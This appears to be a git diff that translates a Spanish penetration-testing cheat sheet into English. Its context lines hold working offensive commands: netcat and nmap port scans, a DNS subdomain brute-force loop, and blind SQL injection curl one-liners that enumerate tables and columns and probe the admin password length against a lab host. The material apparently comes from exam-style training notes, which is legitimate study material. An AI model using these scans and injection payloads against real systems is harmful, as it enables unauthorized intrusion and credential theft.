@@ -19,7 +19,7 @@ https://gist.github.com/starred
 https://about.gitlab.com/
 https://sourceforge.net/
 
-Herramientas para identificar información expuesta en repositorios
+Tools for identifying information exposed in repositories
 https://github.com/michenriksen/gitrob
 https://github.com/gitleaks/gitleaks
 
@@ -35,21 +35,21 @@ cat ping-sweep.txt| grep Up | cut -d " " -f2
 ```
 
 ### Netcat
-1. Escaneo de puertos TCP, netcat realiza el <b>three-way TCP handshak</b>. (-w: tomeout, -z, no envío de datos)
+1. TCP port scanning: netcat performs the <b>three-way TCP handshak</b>. (-w: takeout, -z: no data sending)
 ```bash
 LINUX
 nc -nvv -w 1 -z <IP> 3380-3390 2>&1 | grep open
 WINDOWS
 nc.exe -nvv -w 1 -z <IP> 4140-4145 2>&1 | findstr open
 ```
-2. Escaneo de puertos UDP
+2. UDP Port Scanning
 ```bash
 nc -nv -u -z -w 1 <IP> 100-183 2>&1 | grep -vE "\?"
 ```
 
 ### nmap
 https://rustscan.github.io/RustScan/
-1. Identificar puertos tcp
+1. Identify TCP ports
 ```bash
 nmap -Pn -sS --open -n <IP> --top-ports 10 --min-rate 1000 --max-retries 2 --reason -oN <IP>-top-ports10
 nmap -Pn -sS --open -n <IP> --top-ports 1000 --min-rate 1000 --max-retries 2 --reason -oN <IP>-top-ports1000
@@ -57,20 +57,20 @@ nmap -Pn -sS -n <IP> -p- --min-rate 1000 --max-retries 2 --reason -oN <IP>-tcp-a
 nmap -Pn -sS -sV -n <IP> -p <port1,port2...> --min-rate 1000 --max-retries 2 --reason -oN <IP>-tcp-sV
 nmap -Pn -sS -sV -sC -n <IP> -p <port1,port2...> --min-rate 1000 --max-retries 2 --reason -oN <IP>-tcp-sC
 ```
-2. Identificar puerto udp
+2. Identify UDP port
 ```bash
 nmap -Pn -sU -sV -n <IP> --top-ports 15 --min-rate 1000 --max-retries 2 --reason -oN <IP>-udp-top-15
 nmap -Pn -sU -sV -n <IP> -p <port1,port2...>  --min-rate 1000 --max-retries 2 --reason -oN <IP>-udp-sC
 ```
-3. Filtrar puertos en un formato 80,443,22...
+3. Filter ports in the format 80,443,22...
 ```bash
 cat <FILE> | grep -i "^[0-9]" | cut -d '/' -f 1 | xargs | sed 's/\ /,/g'
 ```
-4. Filtrar hosts con puertos abiertos
+4. Filter hosts with open ports
 ```bash
 cat file-oG | grep open | cut -d " " -f2
 ```
-5. Utilizar scripts para realizar reconocimiento dependiendo el servicio
+5. Use scripts to perform reconnaissance depending on the service
 ```bash
 ls -la /usr/share/nmap/scripts | grep http | grep title
 nmap --script-help http-headers
@@ -106,14 +106,14 @@ host <domain>
 host -t mx <domain>
 host -t txt <domain>
 ```
-1. Ataque de diccionario para identificar dominios DNS
+1. Dictionary attack to identify DNS domains
 ```
 for domain in $(cat domains.txt); do host $domain.megacorpone.com; done | grep -vi NXDOMAIN
 ```
 ```
 for /F "tokens=*" %A in (wordlist.txt) do nslookup -type=TXT %A.megacorptwo.com <IPServerDNS>
 ```
-2. Identificar sub dominios de forma invesa, mediante la dirección IP
+2. Identify subdomains in reverse, using the IP address
 ```
 for ip in $(seq 1 254); do host 200.23.91.$ip; done | grep -vE "not found | record"
 ```
@@ -887,17 +887,17 @@ offsec' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administr
 ```
 
 ```bash
-// Identificar vulnerabilidad, revisando la longitud de respuesta 
+// Identify vulnerability by reviewing response length
 echo "[+] Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" |wc ; while IFS= read -r p; do echo "[+] Payload: $p" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin$p" -x "127.0.0.1:8080" | wc ;done < sqli_payloads.txt
 ```
 
 ```bash
-// Identificar tablas con diccionario
+// Identify tables with a dictionary
 echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+'a'+FROM+$p+LIMIT+1)='a" -x "127.0.0.1:8080" | wc -m;done < sqli_tables.txt
 ```
 
 ```bash
-// Identificar columns con diccionario
+// Identify columns with dictionary
 echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'+and+column_name='$p'+LIMIT+1)='$p" -x "127.0.0.1:8080" | wc -m;done < sqli_columns.txt
 ```
 
@@ -907,7 +907,7 @@ echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.p
 ```
 
 ```bash
-// Identificar tamaño de passwd. el usuario debe ser valido
+// Identify password size. The user must be valid.
 for p in $(seq 1 1 50); do echo "$p" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+'a'+FROM+users+WHERE+username='admin'+AND+LENGTH(password)>$p)='a" -x "127.0.0.1:8080" | wc -m; done
 ```
 
